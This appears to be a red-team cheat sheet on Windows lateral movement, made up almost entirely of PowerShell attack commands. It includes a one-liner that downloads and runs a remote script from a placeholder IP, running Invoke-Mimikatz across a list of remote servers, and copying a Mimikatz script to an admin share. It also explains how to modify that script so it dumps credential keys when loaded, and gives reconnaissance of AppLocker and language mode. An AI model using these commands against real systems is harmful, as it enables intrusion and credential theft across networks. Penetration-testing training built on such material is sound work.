# Lateral Movement

## **Connect to machine with administrator privs**

```
Enter-PSSession -Computername <computername>
```

## **Save and use sessions of a machine**

```
$sess = New-PSSession -Computername <computername>
Enter-PSSession $sess
```

## **Connect to machine with administrator privs**

```
Enter-PSSession -Computername <computername>
$sess = New-PSSession -Computername <computername>
Enter-PSSession $sess
```

## **Execute commands on a machine**

```
Invoke-Command -Computername <computername> -Scriptblock {whoami} 
Invoke-Command -Scriptblock {whoami} $sess
```

## **Load script on a machine**

```
Invoke-Command -Computername <computername> -FilePath <path>
Invoke-Command -FilePath <path> $sess
```

## **Download and load script on a machine**

```
iex (iwr http://xx.xx.xx.xx/<scriptname> -UseBasicParsing)
```

## **Execute locally loaded function on a list of remote machines**

```
Invoke-Command -Scriptblock ${function:<function>} -Computername (Get-Content <list_of_servers>)
Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Computername (Get-Content <list_of_servers>)
```

## **Check the language mode**

```
$ExecutionContext.SessionState.LanguageMode
```

## **Enumerate AppLocker policy**

```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

## **Copy script to other server**

This is a modified MimiKatz script to execute on load.

```
Copy-Item .\Invoke-MimikatzEx.ps1 \\<servername>\c$\'Program Files'
```

To make the modified Mimikatz.ps1 simply duplicate your original mimikatz.ps1 and rename it something like above MimiKatzEX.ps1 and add this to the bottom of the script, after the last }

{% hint style="info" %}
```
Invoke-Mimikatz–Command '"sekurlsa::ekeys
```
{% endhint %}
